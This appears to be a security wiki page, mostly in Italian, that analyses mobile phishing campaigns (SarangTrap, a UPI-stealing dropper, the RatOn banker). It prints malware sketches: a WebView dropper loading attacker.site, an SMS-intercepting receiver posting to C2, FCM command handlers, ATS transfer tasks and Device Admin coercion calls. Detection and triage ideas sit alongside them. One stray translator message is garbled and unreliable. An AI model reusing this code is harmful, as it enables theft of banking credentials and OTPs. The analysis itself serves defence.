# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina copre le tecniche usate dagli threat actor per distribuire **malicious Android APKs** e **iOS mobile-configuration profiles** tramite phishing (SEO, social engineering, fake stores, dating apps, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e da altre ricerche pubbliche.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrare dozzine di domini look-alike (dating, cloud share, car service…).
– Usare parole chiave nella lingua locale ed emoji nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *sia* le istruzioni di installazione Android (`.apk`) sia quelle iOS sulla stessa landing page.
2. **First Stage Download**
* Android: link diretto a un APK *unsigned* o da “third-party store”.
* iOS: `itms-services://` o link HTTPS semplice a un **mobileconfig** profile malevolo (vedi sotto).
3. **Post-install Social Engineering**
* Al primo avvio l'app richiede un **invitation / verification code** (illusione di accesso esclusivo).
* Il codice viene **POSTato over HTTP** al Command-and-Control (C2).
* Il C2 risponde `{"success":true}` ➜ il malware continua.
* Sandbox / AV dynamic analysis che non inviano mai un codice valido non vedono **comportamento maligno** (evasion).
4. **Runtime Permission Abuse** (Android)
* Le permission pericolose sono richieste solo **dopo una risposta positiva del C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Varianti recenti **rimuovono `<uses-permission>` per SMS da `AndroidManifest.xml`** ma lasciano il percorso Java/Kotlin che legge gli SMS via reflection ⇒ abbassa il punteggio statico pur rimanendo funzionale su dispositivi dove la permission è concessa tramite `AppOps` abuse o su target vecchi.
5. **Facade UI & Background Collection**
* L'app mostra view innocue (SMS viewer, gallery picker) implementate localmente.
* Nel frattempo esfiltra:
- IMEI / IMSI, numero di telefono
- Dump completo di `ContactsContract` (array JSON)
- JPEG/PNG da `/sdcard/DCIM` compressi con [Luban](https://github.com/Curzibn/Luban) per ridurre la dimensione
- SMS opzionali (`content://sms`)
I payload vengono **batch-zippati** e inviati via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Un singolo **mobile-configuration profile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, ecc. per iscrivere il dispositivo in una supervisione tipo “MDM”.
* Istruzioni di social-engineering:
1. Apri Impostazioni ➜ *Profile downloaded*.
2. Tocca *Install* tre volte (screenshot sulla pagina di phishing).
3. Trust il profilo non firmato ➜ l'attaccante ottiene i privilegi su *Contacts* & *Photo* senza revisione App Store.
7. **Network Layer**
* Plain HTTP, spesso su porta 80 con HOST header tipo `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Durante l'analisi del malware, automatizzare la fase del codice di invito con Frida/Objection per raggiungere il ramo maligno.
* **Manifest vs. Runtime Diff** – Confrontare `aapt dump permissions` con le `PackageManager#getRequestedPermissions()` a runtime; permessi pericolosi mancanti sono un red flag.
* **Network Canary** – Configurare `iptables -p tcp --dport 80 -j NFQUEUE` per rilevare raffiche di POST sospette dopo l'inserimento del codice.
* **mobileconfig Inspection** – Usare `security cms -D -i profile.mobileconfig` su macOS per elencare `PayloadContent` e individuare entitlements eccessivi.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** per catturare esplosioni improvvise di domini ricchi di parole chiave.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` da client Dalvik fuori dal Play Store.
* **Invite-code Telemetry** – POST di codici numerici di 6–8 cifre poco dopo l'installazione dell'APK può indicare staging.
* **MobileConfig Signing** – Bloccare i configuration profile non firmati tramite policy MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicatori (Generico)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Catena di consegna attraverso piattaforme affidabili
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper con payload incorporato e installazione offline
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Suggerimento per il triage statico (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Scoperta dinamica degli endpoint tramite shortlink
- Malware recupera da uno shortlink una lista in plain-text separata da virgole di endpoint attivi; semplici trasformazioni di stringa producono il percorso finale della pagina di phishing.

Esempio (sanitizzato):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-codice:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Raccolta delle credenziali UPI tramite WebView
- Il passaggio “Make payment of ₹1 / UPI‑Lite” carica un form HTML dell'attaccante dall'endpoint dinamico all'interno di una WebView e cattura campi sensibili (telefono, banca, UPI PIN) che vengono inviati con `POST` a `addup.php`.

Loader minimale:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Vengono richiesti permessi aggressivi al primo avvio:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- I contatti vengono ciclati per inviare in massa smishing SMS dal dispositivo della vittima.
- Gli SMS in arrivo vengono intercettati da un broadcast receiver e caricati con metadata (mittente, corpo, slot SIM, ID casuale per dispositivo) su `/addsm.php`.

Bozza del receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) come C2 resiliente
- Il payload si registra a FCM; i messaggi push contengono un campo `_type` usato come switch per attivare azioni (ad es., aggiornare i template di testo per phishing, attivare/disattivare comportamenti).

Esempio di payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Bozza Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Pattern di hunting e IOCs
- APK contiene un payload secondario in `assets/app.apk`
- WebView carica il pagamento da `gate.htm` ed esfiltra verso `/addup.php`
- Esfiltrazione SMS verso `/addsm.php`
- Fetch di configurazione guidato da shortlink (es., `rebrand.ly/*`) che restituisce endpoint CSV
- App etichettate genericamente “Update/Secure Update”
- Messaggi FCM `data` con un discriminatore `_type` in app non attendibili

### Idee per rilevamento e difesa
- Segnalare app che istruiscono gli utenti a disabilitare la rete durante l'installazione e poi eseguono il side-load di un secondo APK da `assets/`.
- Generare allarme sulla tupla di permessi: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + flussi di pagamento basati su WebView.
- Monitoraggio dell'egress per `POST /addup.php|/addsm.php` su host non aziendali; bloccare infrastrutture note.
- Regole Mobile EDR: app non attendibili che si registrano per FCM e fanno branching su un campo `_type`.

---

## Abuso di Android Accessibility/Overlay & Device Admin, automazione ATS e orchestrazione relay NFC – studio del caso RatOn

La campagna RatOn banker/RAT (ThreatFabric) è un esempio concreto di come le moderne operazioni di mobile phishing combinino WebView droppers, automazione UI guidata da Accessibility, overlays/ransom, coercizione Device Admin, Automated Transfer System (ATS), crypto wallet takeover e persino orchestrazione relay NFC. Questa sezione astrae le tecniche riutilizzabili.

### Fase-1: WebView → ponte di installazione nativa (dropper)
Gli attaccanti presentano una WebView che punta a una pagina dell'attaccante e iniettano un'interfaccia JavaScript che espone un installer nativo. Un tap su un bottone HTML richiama codice nativo che installa un APK di second stage incluso negli assets del dropper e poi lo avvia direttamente.

Schema minimo:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Non vedo alcun contenuto. Per favore incolla l'HTML (o il testo/markdown) della pagina che vuoi tradurre. 

Nota: manterrò intatti tag, link, percorsi e codice (non verranno tradotti) e restituirò solo la traduzione del testo rilevante in italiano, conservando tutta la sintassi markdown/html.
```html
<button onclick="bridge.installApk()">Install</button>
```
Dopo l'installazione, il dropper avvia il payload tramite package/activity esplicito:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Idea per il rilevamento: app non attendibili che chiamano `addJavascriptInterface()` ed espongono metodi simili a quelli di un installer a WebView; APK che contiene un payload secondario incorporato in `assets/` e invoca la Package Installer Session API.

### Flusso di consenso: Accessibility + Device Admin + richieste runtime successive
Stage-2 apre una WebView che ospita una pagina “Access”. Il suo pulsante invoca un metodo esportato che porta la vittima nelle impostazioni Accessibility e richiede l'abilitazione del servizio malevolo. Una volta concesso, il malware usa Accessibility per cliccare automaticamente attraverso i successivi dialog di autorizzazione runtime (contatti, overlay, manage system settings, ecc.) e richiede Device Admin.

- Accessibility aiuta in modo programmatico ad accettare i prompt successivi trovando pulsanti come “Allow”/“OK” nell'albero dei nodi e simulando clic.
- Controllo/richiesta permesso overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vedi anche:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Gli operatori possono inviare comandi per:
- rendere un overlay a schermo intero da un URL, oppure
- passare HTML inline che viene caricato in un overlay WebView.

Usi probabili: coercizione (inserimento PIN), apertura del wallet per catturare i PIN, messaggi di riscatto. Tenere un comando per assicurarsi che il permesso per l'overlay sia concesso se mancante.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: eseguire periodicamente il dump dell'albero dei nodi Accessibility, serializzare i testi/ruoli/bounds visibili e inviarli al C2 come pseudo-schermo (comandi come `txt_screen` una tantum e `screen_live` continuo).
- High-fidelity: richiedere MediaProjection e avviare lo screen-casting/registrazione su richiesta (comandi come `display` / `record`).

### ATS playbook (bank app automation)
Dato un task JSON, aprire l'app bancaria, pilotare l'UI via Accessibility con una combinazione di query testuali e tap per coordinate, e inserire il PIN di pagamento della vittima quando richiesto.

Esempio di task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Esempi di testi visti in un flusso target (CZ → EN):
- "Nová platba" → "Nuovo pagamento"
- "Zadat platbu" → "Inserisci pagamento"
- "Nový příjemce" → "Nuovo beneficiario"
- "Domácí číslo účtu" → "Numero di conto nazionale"
- "Další" → "Avanti"
- "Odeslat" → "Invia"
- "Ano, pokračovat" → "Sì, continua"
- "Zaplatit" → "Paga"
- "Hotovo" → "Fatto"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Estrazione della seed phrase dei wallet crypto
Target come MetaMask, Trust Wallet, Blockchain.com, Phantom. Flusso: sbloccare (PIN rubato o password fornita), navigare in Security/Recovery, rivelare/mostrare la seed phrase, keylog/exfiltrate it. Implementare selettori sensibili alla locale (EN/RU/CZ/SK) per stabilizzare la navigazione tra le lingue.

### Coercizione Device Admin
Le Device Admin APIs vengono usate per aumentare le opportunità di cattura del PIN e ostacolare la vittima:

- Blocco immediato:
```java
dpm.lockNow();
```
- Far scadere la credenziale corrente per forzare il cambio (Accessibility cattura il nuovo PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzare lo sblocco non biometrico disabilitando le funzionalità biometriche del keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Molti controlli di DevicePolicyManager richiedono Device Owner/Profile Owner su versioni recenti di Android; alcune build OEM possono essere più permissive. Validare sempre sul target OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 può installare e lanciare un modulo NFC-relay esterno (es., NFSkate) e perfino passargli un template HTML per guidare la vittima durante il relay. Questo abilita operazioni di cash-out contactless con carta presente insieme a ATS online.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Set di comandi operatore (esempio)
- UI/stato: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Sovrapposizioni: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Dispositivo: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Idee per rilevamento e difesa (stile RatOn)
- Cercare WebViews con `addJavascriptInterface()` che espongono metodi installer/permission; pagine che terminano in “/access” che attivano prompt di Accessibility.
- Segnalare app che generano gesti/click di Accessibility ad alta frequenza poco dopo che è stato concesso l'accesso al servizio; telemetria che somiglia a Accessibility node dumps inviati al C2.
- Monitorare modifiche alle policy di Device Admin in app non attendibili: `lockNow`, scadenza password, toggle di feature keyguard.
- Allertare su prompt di MediaProjection da app non aziendali seguiti da upload periodici di frame.
- Rilevare l'installazione/avvio di un'app NFC-relay esterna attivata da un'altra app.
- Per il banking: imporre conferme out-of-band, binding biometrici e limiti di transazione resistenti all'automazione on-device.

## Riferimenti

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
